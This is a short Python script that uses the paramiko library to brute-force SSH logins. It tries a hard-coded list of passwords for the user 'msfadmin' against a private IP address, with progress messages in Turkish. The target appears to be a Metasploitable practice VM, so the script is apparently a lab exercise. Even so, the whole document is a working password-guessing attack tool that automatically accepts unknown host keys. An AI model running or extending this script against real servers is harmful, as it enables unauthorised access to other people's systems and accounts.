import paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
ip = "192.168.56.101"
port = 22
username = "msfadmin"
password = ["paassword", "password2", "msfadmin"]

for password in password:
    try:
        ssh.connect(ip, port, username, password)
        print(f"Başarılı! Kullanıcı: {username}, Şifre: {password}")
        break
    except paramiko.AuthenticationException:
        print(f"Hatalı şifre denendi: {password}")
    except Exception as e:
        print(f"Bir hata oluştur: {str(e)}")

ssh.close()